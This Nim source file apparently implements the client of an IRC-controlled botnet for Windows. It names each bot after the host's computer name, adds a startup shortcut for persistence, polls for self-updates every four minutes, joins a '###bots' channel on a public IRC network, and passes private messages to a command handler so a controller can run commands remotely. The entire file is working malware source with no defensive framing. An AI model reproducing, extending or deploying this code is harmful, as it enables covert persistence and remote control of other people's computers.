import irc, asyncdispatch, winim, random, strutils, threadpool

import command_handler, update_handler



proc generateName():string = 
  var
    name_buffer: array[0..15, WCHAR]
    name_size : DWORD
    name : string
  name_size = 15*sizeof(WCHAR)

  ## Nickname is based on computer name
  if GetComputerName(cast[LPWSTR](addr name_buffer[0]), addr name_size) == 0:
      raise newException(OSError, "Failed to retrieve computer name")

  ## The computer name needs to become a proper string as opposed to a raw buffer
  var loop_len:int

  loop_len = if len(name_buffer) < 5: len(name_buffer) else: 5

  for i in 0..<loop_len:
      if name_buffer[i] != 0:
          name &= cast[char](name_buffer[i])
      else:
          break

  randomize()

  var
    suffix_utf8:string
    name_len = len(name)

  while len(suffix_utf8)+name_len < 16:
    var
      rand_char_number:char = char(rand(0x30..0x39))
      rand_char_smallL:char = char(rand(0x61..0x7A))
      rand_char_capitL:char = char(rand(0x41..0x5A))
      rand_picker:int = rand(0..2)

    case rand_picker:
    of 0:
      suffix_utf8 &= rand_char_number
    of 1:
      suffix_utf8 &= rand_char_smallL
    of 2:
      suffix_utf8 &= rand_char_capitL
    else:
      discard

  return name & suffix_utf8



while true:
  # Check for updates
  waitFor updt_clearTemp()
  #discard updt_check(false, nil, IrcEvent())
  echo "Running here"



  proc updatePoller() {.async.} =
    while true:
      discard updt_check(false, nil, IrcEvent())
      await sleepAsync(240000) # wait 4 minutes

  if g_first_run:
    g_first_run = false
    discard updatePoller()

  updt_createStartupShortcut()

  var name = generateName()

  if g_dbg: echo "Generated Name: ", name

  ## The final nickname must be 16 chars long so the rest will be filled with random digits

  var
    target_channel:string = "###bots"


  if g_dbg: echo "Trying to connect"

  if g_dbg: echo "Connected"

  proc onIrcEvent(client: AsyncIrc, event: IrcEvent) {.async.} =
    try:
      case event.typ
      of EvConnected:
        discard
      of EvDisconnected, EvTimeout:
        #break
        await client.reconnect()
      of EvMsg:
        if event.cmd == MPrivMsg:
          if event.origin != target_channel:
            spawn cmdh_handle(event, client)
        if event.raw.contains(":End of /NAMES list."):
          ## Notify the controller that the bot has joined
          discard client.privmsg(target_channel,".")
        
        if g_dbg: echo(event.raw)
    except OSError as e:
      echo "onIrcEvent exception: [", repr(e), "]"
  try:
    var  client = newAsyncIrc("irc.libera.chat", nick=name , joinChans = @[target_channel], realname = "Zanza", user="Zanza", callback = onIrcEvent)

    try:
      asyncCheck client.run()
    except:
      echo "FUCKING HELL"
      Sleep(10000)

    try:
      runForever()
    except:
      echo "EVERYTHING IS FUCKED UP. RETRYING"
      Sleep(15000)
      g_first_run = true
  except OSError as e:
    echo "HELP HeeeeeEEEEELP: [", repr(e), "]"